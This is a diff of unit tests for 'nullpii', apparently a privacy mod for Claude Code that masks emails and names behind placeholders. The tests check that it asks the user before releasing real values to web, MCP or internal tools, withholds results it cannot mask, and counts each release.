+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Send once'], asked);
+  on('tool.call', { tool: 'WebSearch' }, () => ({
+    result: { 'john@acme.io': 'owner', structuredContent: undefined },
+  }));
+  on('tool.call', { tool: 'mcp__notes__read' }, () => ({
+    result: { content: [{ type: 'text', text: 'ok' }], structuredContent: undefined },
+  }));
+  await start($);
+  const out = await $.tool.call({ tool: 'WebSearch', query: 'owners' });
+  expect(out.deny).toBeUndefined();
+  expect(asked).toHaveLength(1);
+  expect(out.result).toEqual({ 'john@acme.io': 'owner' });
+  // With no masked key there is nothing to ask, and nothing is withheld.
+  const plain = await $.tool.call({ tool: 'mcp__notes__read', id: '1' });
+  expect(plain.deny).toBeUndefined();
+  expect(plain.result).toEqual({ content: [{ type: 'text', text: 'ok' }] });
+  expect(asked).toHaveLength(1);
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).not.toContain('does not have the shape of the result');
+});
+
+test('Send once sends exactly the values the question listed, not one the vault learns while it is open', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const test$ = $;
+  const asked: string[] = [];
+  on('tool.call', { tool: 'AskUserQuestion' }, async (_hook$, e) => {
+    const question = e.questions[0]?.question ?? '';
+    asked.push(question);
+    // While the dialog is open, other text is masked: PERSON_1 now stands
+    // for a real value, though it stood for nothing when the question was put.
+    await test$.prompt.submit({ text: 'and John too', wait: false, origin: COMPOSER });
+    return { result: { questions: e.questions, answers: { [question]: 'Send once' } } };
+  });
+  const urls: string[] = [];
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', { tool: 'WebFetch' }, ($, e) => {
+    urls.push(e.url);
+    return { result: 'ok' };
+  });
+  await start($);
+  await $.prompt.submit({ text: 'look up john@acme.io', wait: false, origin: COMPOSER });
+  await $.tool.call({
+    tool: 'WebFetch',
+    url: `https://example.com/?a=${ph('EMAIL', 0)}&b=${ph('PERSON', 1)}`,
+    prompt: 'x',
+  });
+  expect(asked).toHaveLength(1);
+  expect(asked[0]).not.toContain('person');
+  expect(urls).toEqual([`https://example.com/?a=john@acme.io&b=${ph('PERSON', 1)}`]);
+  expect(sidecar.toasts.filter((t) => t.includes('in clear'))).toHaveLength(1);
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).not.toContain('WebFetch · person');
+  expect(report.text).toContain('Placeholders kept in calls to other tools: 1');
+});
+
+test('a value sent once is toasted and counted only when the call runs: a refusal below records nothing', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Send once'], asked);
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  // What lies below refuses the rewritten call, as Claude Code does in
+  // auto mode: nothing was sent.
+  on('tool.call', { tool: 'WebFetch' }, () => ({ deny: 'a hook changed this call' }));
+  await start($);
+  await $.prompt.submit({ text: 'look up john@acme.io', wait: false, origin: COMPOSER });
+  const out = await $.tool.call({
+    tool: 'WebFetch',
+    url: `https://example.com/?q=${ph('EMAIL', 0)}&b=${ph('EMAIL', 7)}`,
+    prompt: 'x',
+  });
+  expect(asked).toHaveLength(1);
+  expect(out.deny).toBeDefined();
+  expect(sidecar.toasts.filter((t) => t.includes('in clear'))).toEqual([]);
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).not.toContain('Released in clear');
+  // Neither the sent value nor the unknown placeholder beside it went
+  // anywhere: the call was refused.
+  expect(report.text).toContain('Real values put back into local tool calls: 0');
+  expect(report.text).toContain('Placeholders kept in calls to other tools: 0');
+});
+
+test('a call to an MCP tool is put to the user, and the question says the values leave through its server', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Send once'], asked);
+  const saved: string[] = [];
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', { tool: 'mcp__notes__save' }, ($, e) => {
+    saved.push(e.text);
+    return { result: 'saved' };
+  });
+  await start($);
+  await $.prompt.submit({ text: 'save john@acme.io', wait: false, origin: COMPOSER });
+  await $.tool.call({ tool: 'mcp__notes__save', text: `contact ${ph('EMAIL', 0)}` });
+  expect(asked).toHaveLength(1);
+  expect(asked[0]?.question).toContain('mcp__notes__save');
+  expect(asked[0]?.question).toContain('MCP server');
+  expect(asked[0]?.question).toContain('leave this machine');
+  expect(saved).toEqual(['contact john@acme.io']);
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).toContain('Released in clear on your word: mcp__notes__save · email 1');
+});
+
+/** Claude Code's own tools that talk only to Claude, its subagents or the
+ * user, other than AskUserQuestion. */
+const INTERNAL_TOOLS = ['TodoWrite', 'Agent', 'Task', 'ExitPlanMode', 'SendMessage', 'Skill'];
+
+/** A call to `tool` holding `email` in each argument an internal tool reads. */
+function internalCall(tool: string, email: string) {
+  return {
+    tool,
+    prompt: `Find mails from ${email}`,
+    todos: [{ content: `Reply to ${email}` }],
+  };
+}
+
+/** Record every tool that ran and the mod's own questions, answering the
+ * mod's questions with `answers` in turn (none left: no one answers, as in
+ * a `claude -p` run). */
+function recordTools(on, answers: readonly string[]) {
+  const modAsked: string[] = [];
+  const ran: string[] = [];
+  let at = 0;
+  on('tool.call', ($, e) => {
+    const first = e.questions?.[0];
+    if (e.tool === 'AskUserQuestion' && first?.header === 'nullpii') {
+      modAsked.push(first.question);
+      const label = answers[at++];
+      if (label === undefined) return { deny: 'no one to ask' };
+      return { result: { questions: e.questions, answers: { [first.question]: label } } };
+    }
+    ran.push(`${e.tool}: ${JSON.stringify([e.prompt, e.todos])}`);
+    return { result: 'ok' };
+  });
+  return { modAsked, ran };
+}
+
+test("Claude Code's own tools are asked about too, and with no one to answer their calls are refused", async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const { modAsked, ran } = recordTools(on, []);
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  await start($);
+  await $.prompt.submit({ text: 'email john@acme.io', wait: false, origin: COMPOSER });
+  for (const tool of INTERNAL_TOOLS) {
+    const out = await $.tool.call(internalCall(tool, ph('EMAIL', 0)));
+    expect(out.deny).toContain('nullpii did not run this call');
+  }
+  expect(ran).toEqual([]);
+  expect(modAsked).toHaveLength(INTERNAL_TOOLS.length);
+  // The question says what the mod cannot see: what the tool hands on.
+  const agent = modAsked[INTERNAL_TOOLS.indexOf('Agent')] ?? '';
+  expect(agent).toContain('Agent');
+  expect(agent).toContain('has no hook on what it hands on inside Claude Code');
+  expect(agent).toContain('can reach a Claude model unmasked');
+  // And that a subagent can then pass them on unasked, as plain text.
+  expect(agent).toContain(
+    'can pass them to any tool, a shell command included, with no further question',
+  );
+  expect(sidecar.toasts.filter((t) => t.includes('in clear'))).toEqual([]);
+});
+
+test("Allow all lets Claude Code's own tools run with the real values, each toasted and counted", async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const { modAsked, ran } = recordTools(on, ['Allow all']);
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  await start($);
+  await $.prompt.submit({ text: 'email john@acme.io', wait: false, origin: COMPOSER });
+  for (const tool of INTERNAL_TOOLS) {
+    const out = await $.tool.call(internalCall(tool, ph('EMAIL', 0)));
+    expect(out.deny).toBeUndefined();
+  }
+  expect(modAsked).toHaveLength(1);
+  expect(ran).toHaveLength(INTERNAL_TOOLS.length);
+  for (const line of ran) expect(line).toContain('john@acme.io');
+  expect(sidecar.toasts.filter((t) => t.includes('in clear'))).toHaveLength(INTERNAL_TOOLS.length);
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).toContain('Released in clear on your word: TodoWrite · email 1');
+  expect(report.text).toContain('Released in clear on your word: Agent · email 1');
+});
+
+test('a masked object key in the result of a tool outside restoreTools is asked about; one in restoreTools is not', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Block'], asked);
+  on('tool.call', { tool: 'Bash' }, () => ({ result: { 'john@acme.io': 'owner' } }));
+  on('tool.call', { tool: 'Read' }, () => ({ result: { 'john@acme.io': 'owner' } }));
+  await start($);
+  const bash = await $.tool.call({ tool: 'Bash', command: 'cat owners.json' });
+  expect(asked).toHaveLength(1);
+  expect(bash.deny).toContain("nullpii withheld this tool's result");
+  const read = await $.tool.call({ tool: 'Read', file_path: 'owners.json' });
+  expect(asked).toHaveLength(1);
+  expect(read.deny).toBeUndefined();
+  expect(JSON.stringify(read.result)).not.toContain('john@acme.io');
+});
+
+test('Send once on a file tool the policy drops still goes through the policy-file guard', async ($, on) => {
+  // The policy file's path holds a masked segment, and Write is outside
+  // restoreTools: Send once puts the real path back, and the guard sees
+  // that the call would now write the policy file.
+  const sidecar = fakeSidecar({ restoreTools: ['Read'], policyFile: '/srv/John/cfg.json' });
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Send once'], asked);
+  const written: string[] = [];
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', { tool: 'Write' }, ($, e) => {
+    written.push(e.file_path);
+    return { result: 'ok' };
+  });
+  await start($);
+  await $.prompt.submit({ text: 'my name is John', wait: false, origin: COMPOSER });
+  const out = await $.tool.call({
+    tool: 'Write',
+    file_path: `/srv/${ph('PERSON', 0)}/cfg.json`,
+    content: '{}',
+  });
+  expect(asked).toHaveLength(1);
+  expect(out.deny).toContain('would change the nullpii masking policy file');
+  expect(written).toEqual([]);
+  // Refused after the answer: nothing was sent, so nothing is toasted or counted.
+  expect(sidecar.toasts.filter((t) => t.includes('in clear'))).toEqual([]);
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).not.toContain('Released in clear');
+});
+
+test('the guide names as examples only tools the policy does not list', async ($, on) => {
+  const sidecar = fakeSidecar({ restoreTools: ['Read', 'WebFetch', 'TodoWrite'] });
+  stubSession(on, sidecar);
+  on('prompt.compose', () => ({ sections: [] }));
+  await start($);
+  const { sections } = await $.prompt.compose({
+    model: 'claude-test',
+    promptModel: 'claude-test',
+    surfaces: ['terminal'],
+    tools: ['Read'],
+    outputStyle: null,
+    traits: [],
+  });
+  const text = sections[0]?.text ?? '';
+  expect(text).toContain("Claude Code's own included (such as Agent, MCP tools)");
+  expect(text).toContain('AskUserQuestion is never asked about');
+  expect(text).toContain('put the real values back before they run: Read, WebFetch, TodoWrite.');
+});
+
+test('the guide says nothing of AskUserQuestion running with placeholders when the policy lists it', async ($, on) => {
+  const sidecar = fakeSidecar({ restoreTools: ['Read', 'AskUserQuestion'] });
+  stubSession(on, sidecar);
+  on('prompt.compose', () => ({ sections: [] }));
+  await start($);
+  const { sections } = await $.prompt.compose({
+    model: 'claude-test',
+    promptModel: 'claude-test',
+    surfaces: ['terminal'],
+    tools: ['Read'],
+    outputStyle: null,
+    traits: [],
+  });
+  expect(sections[0]?.text ?? '').not.toContain('AskUserQuestion is never asked about');
+});
+
+test('a local restore into a call that throws below is counted: it was handed on', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', { tool: 'Write' }, () => {
+    throw new Error('disk full');
+  });
+  await start($);
+  await $.prompt.submit({ text: 'note john@acme.io', wait: false, origin: COMPOSER });
+  const out = await $.tool.call({ tool: 'Write', file_path: 'n.md', content: ph('EMAIL', 0) });
+  expect(out.deny).toContain("nullpii could not mask this tool's result, so it was withheld");
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).toContain('Real values put back into local tool calls: 1');
+});
+
+test('a call that comes back as an error after Send once is recorded as released', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Send once'], asked);
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  // As Claude Code answers a call it declined itself: an error result.
+  on('tool.call', { tool: 'WebFetch' }, () => ({
+    result: 'Error: the user declined',
+    text: 'Error: the user declined',
+    isError: true,
+  }));
+  await start($);
+  await $.prompt.submit({ text: 'look up john@acme.io', wait: false, origin: COMPOSER });
+  await $.tool.call({
+    tool: 'WebFetch',
+    url: `https://example.com/?q=${ph('EMAIL', 0)}`,
+    prompt: 'x',
+  });
+  expect(sidecar.toasts.filter((t) => t.includes('released in clear'))).toHaveLength(1);
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).toContain('Released in clear on your word: WebFetch · email 1');
+});
+
+test('Send once puts a value back in an object key of a call too', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Send once'], asked);
+  const received: unknown[] = [];
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', { tool: 'mcp__crm__save' }, ($, e) => {
+    received.push(e.data);
+    return { result: 'saved' };
+  });
+  await start($);
+  await $.prompt.submit({ text: 'look up john@acme.io', wait: false, origin: COMPOSER });
+  await $.tool.call({ tool: 'mcp__crm__save', data: { [ph('EMAIL', 0)]: 'owner' } });
+  expect(asked).toHaveLength(1);
+  expect(received).toEqual([{ 'john@acme.io': 'owner' }]);
+  expect(sidecar.toasts.filter((t) => t.includes('released in clear'))).toHaveLength(1);
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).toContain('Released in clear on your word: mcp__crm__save · email 1');
+  expect(report.text).toContain('Placeholders kept in calls to other tools: 0');
+});
+
+test('while masking is paused, a value released in clear is still toasted and counted', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  on('tool.call', { tool: 'AskUserQuestion' }, ($, e) => {
+    const question = e.questions[0]?.question ?? '';
+    const label = question.includes(PAUSE_QUESTION_WORDS) ? 'Pause masking' : 'Send once';
+    return { result: { questions: e.questions, answers: { [question]: label } } };
+  });
+  const urls: string[] = [];
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', { tool: 'WebFetch' }, ($, e) => {
+    urls.push(e.url);
+    return { result: 'ok' };
+  });
+  await start($);
+  // A placeholder minted before the pause.
+  await $.prompt.submit({ text: 'look up john@acme.io', wait: false, origin: COMPOSER });
+  expect((await $.command.run(typed('pii', 'pause'))).text).toContain('Masking is paused');
+  await $.tool.call({
+    tool: 'WebFetch',
+    url: `https://example.com/?q=${ph('EMAIL', 0)}`,
+    prompt: 'x',
+  });
+  expect(urls).toEqual(['https://example.com/?q=john@acme.io']);
+  expect(sidecar.toasts.filter((t) => t.includes('released in clear'))).toHaveLength(1);
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).toContain('Released in clear on your word: WebFetch · email 1');
+});
+
+test('a masked key holding several values lists, toasts and counts each value once, with its own category', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Send once'], asked);
+  const key = 'John <john@acme.io> (owner)';
+  // The same key in five entries: the sidecar masks it once per walk.
+  on('tool.call', { tool: 'mcp__crm__people' }, () => ({
+    result: { rows: [1, 2, 3, 4, 5].map((n) => ({ [key]: n })) },
+  }));
+  await start($);
+  const out = await $.tool.call({ tool: 'mcp__crm__people', q: 'owners' });
+  expect(asked).toHaveLength(1);
+  const question = asked[0]?.question ?? '';
+  expect(question).toContain('email "joh…e.io"');
+  expect(question).toContain('person "John"');
+  // No short form cut from the whole key, and each value named once.
+  expect(question).not.toContain('Joh…ner)');
+  expect(question.split('email "').length - 1).toBe(1);
+  expect(out.result).toEqual({ rows: [1, 2, 3, 4, 5].map((n) => ({ [key]: n })) });
+  // One toast for the result, each category counted once, no value in it.
+  expect(sidecar.toasts.filter((t) => t.includes('in clear'))).toEqual([
+    'nullpii released in clear to Claude (a key of a mcp__crm__people result) on your word: person 1, email 1',
+  ]);
+  expectNoValueShown(sidecar, ['john@acme.io', 'joh…e.io', 'John']);
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).toContain('Released in clear on your word: mcp__crm__people · email 1');
+  expect(report.text).toContain('Released in clear on your word: mcp__crm__people · person 1');
+});
+
+test('the key question says Claude can copy keys sent in clear into any later call', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Block'], asked);
+  on('tool.call', { tool: 'WebSearch' }, () => ({ result: { 'john@acme.io': 1 } }));
+  await start($);
+  await $.tool.call({ tool: 'WebSearch', query: 'x' });
+  expect(asked[0]?.question).toContain(
+    'can copy them into any later call, a shell command included',
+  );
+});
+
+test('values sent in clear count as sent, not as restored into a local tool; a local restore counts once the call ran', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Send once'], asked);
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', { tool: 'WebFetch' }, () => ({ result: 'ok' }));
+  // A local tool refused below: its restore did not happen.
+  on('tool.call', { tool: 'Write' }, () => ({ deny: 'refused below' }));
+  await start($);
+  await $.prompt.submit({ text: 'look up john@acme.io', wait: false, origin: COMPOSER });
+  await $.tool.call({
+    tool: 'WebFetch',
+    url: `https://example.com/?q=${ph('EMAIL', 0)}`,
+    prompt: 'x',
+  });
+  await $.tool.call({ tool: 'Write', file_path: 'n.md', content: ph('EMAIL', 0) });
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).toContain('Released in clear on your word: WebFetch · email 1');
+  expect(report.text).toContain('Real values put back into local tool calls: 0');
+});
+
+test('a call that throws below after Send once is recorded as sent, and its result is withheld', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Send once'], asked);
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', { tool: 'WebFetch' }, () => {
+    throw new Error('network down');
+  });
+  await start($);
+  await $.prompt.submit({ text: 'look up john@acme.io', wait: false, origin: COMPOSER });
+  const out = await $.tool.call({
+    tool: 'WebFetch',
+    url: `https://example.com/?q=${ph('EMAIL', 0)}`,
+    prompt: 'x',
+  });
+  expect(out.deny).toContain("nullpii could not mask this tool's result, so it was withheld");
+  // It may have run: the value is toasted and counted, never left uncounted.
+  expect(sidecar.toasts.filter((t) => t.includes('in clear'))).toHaveLength(1);
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).toContain('Released in clear on your word: WebFetch · email 1');
+});
+
+/** Answer the mod's own dialogs with `modAnswer` (none: dismissed) and
+ * Claude's own question with `answer(question, options)`, recording what
+ * the user was shown. */
+function answerQuestions(
+  on,
+  modAnswer: string | undefined,
+  answer: (e) => Record<string, unknown>,
+) {
+  const modAsked: string[] = [];
+  const shown: string[] = [];
+  on('tool.call', { tool: 'AskUserQuestion' }, ($, e) => {
+    const first = e.questions?.[0];
+    if (first?.header === 'nullpii') {
+      modAsked.push(first.question);
+      if (modAnswer === undefined) return { deny: 'dismissed' };
+      return { result: { questions: e.questions, answers: { [first.question]: modAnswer } } };
+    }
+    shown.push(first?.question ?? '');
+    return { result: answer(e) };
+  });
+  return { modAsked, shown };
+}
+
+/** Record each `$.ui.notice` line the mod draws, by the call it is for. */
+function recordNotices(on) {
+  const notices: { tool_use_id: string; text: string | undefined }[] = [];
+  on('ui.notice', ($, e) => {
+    notices.push({ tool_use_id: e.tool_use_id, text: e.text });
+    return { value: undefined };
+  });
+  return notices;
+}
+
+test("Claude's own question runs with its placeholders, unasked, and the user is shown what they stand for", async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const notices = recordNotices(on);
+  // No one answers the mod, as in `claude -p`: the question runs anyway.
+  const { modAsked, shown } = answerQuestions(on, undefined, (e) => ({
+    questions: e.questions,
+    answers: { [e.questions[0].question]: 'Yes, and cc John' },
+  }));
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  await start($);
+  await $.prompt.submit({ text: 'write to john@acme.io', wait: false, origin: COMPOSER });
+  const email = ph('EMAIL', 0);
+  const unknown = ph('EMAIL', 7);
+  const question = `Should I email ${email} or ${unknown}?`;
+  const out = await $.tool.call({
+    tool: 'AskUserQuestion',
+    tool_use_id: 'toolu_q1',
+    questions: [{ question, header: 'Email', options: [] }],
+  });
+  expect(modAsked).toEqual([]);
+  // The tool got the question as Claude wrote it.
+  expect(shown).toEqual([question]);
+  // The legend: under that call's dialog, the known placeholder and its
+  // value, whole; the unknown one left out.
+  expect(notices).toEqual([
+    { tool_use_id: 'toolu_q1', text: `nullpii, for Claude's question: ${email} = john@acme.io` },
+  ]);
+  // Claude reads the result as Claude Code returned it, masked like any
+  // result: the question key as written, the typed name masked.
+  expect(out.deny).toBeUndefined();
+  const answers = (out.result as { answers: Record<string, string> }).answers;
+  expect(Object.keys(answers)).toEqual([question]);
+  expect(answers[question]).toMatch(/^Yes, and cc \{\{PII_PERSON_\d+_[0-9a-f]{16}\}\}$/);
+  expect(JSON.stringify(out)).not.toContain('john@acme.io');
+  expect(JSON.stringify(out)).not.toContain("for Claude's question");
+  expectNoValueShown(sidecar, ['john@acme.io', 'joh…e.io', 'John']);
+  expect(sidecar.toasts.filter((t) => t.includes('in clear'))).toEqual([]);
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).not.toContain('Released in clear');
+});
+
+test("Claude's own question holding only placeholders the session does not know shows no legend", async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const notices = recordNotices(on);
+  answerQuestions(on, undefined, (e) => ({
+    questions: e.questions,
+    answers: { [e.questions[0].question]: 'Yes' },
+  }));
+  await start($);
+  const out = await $.tool.call({
+    tool: 'AskUserQuestion',
+    tool_use_id: 'toolu_q2',
+    questions: [{ question: `Email ${ph('EMAIL', 7)}?`, header: 'Email', options: [] }],
+  });
+  expect(out.deny).toBeUndefined();
+  expect(notices).toEqual([]);
+});
+
+test("Claude's question keyed by a value the sidecar masks gets no key question, and its answer is kept", async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  // No one answers the mod: a key question would withhold the result.
+  const { modAsked } = answerQuestions(on, undefined, (e) => ({
+    questions: e.questions,
+    answers: { [e.questions[0].question]: 'Yes' },
+  }));
+  await start($);
+  const out = await $.tool.call({
+    tool: 'AskUserQuestion',
+    questions: [{ question: 'Email John?', header: 'Email', options: [] }],
+  });
+  expect(modAsked).toEqual([]);
+  expect(out.deny).toBeUndefined();
+  const answers = (out.result as { answers: Record<string, string> }).answers;
+  expect(Object.values(answers)).toEqual(['Yes']);
+  expect(JSON.stringify(out)).not.toContain('John');
+});
+
+test('a placeholder text a tool wrote in its own key is not asked about, sent or counted', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Send once'], asked);
+  const stale = '{{PII_EMAIL_9_ffffffffffffffff}}';
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', { tool: 'mcp__notes__list' }, () => ({
+    result: { [`${stale} John`]: 1, [`${ph('EMAIL', 0)} Mary Ann`]: 2 },
+  }));
+  await start($);
+  await $.prompt.submit({ text: 'look up john@acme.io', wait: false, origin: COMPOSER });
+  const out = await $.tool.call({ tool: 'mcp__notes__list', q: 'x' });
+  // An unknown placeholder and a known one, both written by the tool: only
+  // the two names the sidecar masked are listed, sent and counted.
+  expect(out.deny).toBeUndefined();
+  expect(asked).toHaveLength(1);
+  expect(asked[0]?.question).toContain('person "John"');
+  expect(asked[0]?.question).toContain('person "Mary Ann"');
+  expect(asked[0]?.question).not.toContain('email');
+  expect(out.result).toEqual({ [`${stale} John`]: 1, [`${ph('EMAIL', 0)} Mary Ann`]: 2 });
+  expect(sidecar.toasts.filter((t) => t.includes('in clear'))).toHaveLength(1);
+  expectNoValueShown(sidecar, ['John', 'Mary Ann']);
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).toContain('Released in clear on your word: mcp__notes__list · person 2');
+  expect(report.text).not.toContain('mcp__notes__list · email');
+});
+
+test('a masked key whose placeholder the sidecar does not know withholds the result, with no question', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Send once'], asked);
+  on('tool.call', { tool: 'WebSearch' }, () => ({ result: { 'john@acme.io': 1 } }));
+  await start($);
+  sidecar.state.forgetKeys = true;
+  const out = await $.tool.call({ tool: 'WebSearch', query: 'x' });
+  expect(asked).toEqual([]);
+  expect(out.deny).toContain("nullpii could not mask this tool's result");
+  expect(JSON.stringify(out)).not.toContain('john@acme.io');
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).toContain('the sidecar does not know a placeholder it put in a masked key');
+});
+
 test('with no sidecar answering, the mod starts nullpii-gateway for the session', async ($, on) => {
   const sidecar = fakeSidecar({ down: true });
   stubSession(on, sidecar);
@@ -2661,8 +3875,8 @@ test('while a policy change is being settled, the band is up with no button: onl
 test('a policy changed outside the session is put back unless the user keeps it, before a tool gets values', async ($, on) => {
   const sidecar = fakeSidecar();
   stubSession(on, sidecar);
-  const questions: string[] = [];
-  answerDialog(on, 'Put back the previous policy', questions);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Put back the previous policy', 'Block'], asked);
   on('prompt.submit', ($, e) => ({ text: e.text }));
   on('tool.call', { tool: 'WebFetch' }, ($, e) => ({ result: { fetched: e.url } }));
   await start($);
@@ -2671,9 +3885,11 @@ test('a policy changed outside the session is put back unless the user keeps it,
 
   const out = await $.tool.call({ tool: 'WebFetch', url: `https://x.test/?q=${ph('PERSON', 0)}` });
 
-  expect(questions).toHaveLength(1);
+  // The change is put back first; then the web tool is one the policy does
+  // not list again, so its call is denied unless the user sends the values.
+  expect(asked).toHaveLength(2);
   expect(sidecar.policyBodies).toEqual([{}]);
-  expect(JSON.stringify(out)).toContain(ph('PERSON', 0));
+  expect(out.deny).toContain('nullpii did not run this call');
   expect(JSON.stringify(out)).not.toContain('John');
 });
 
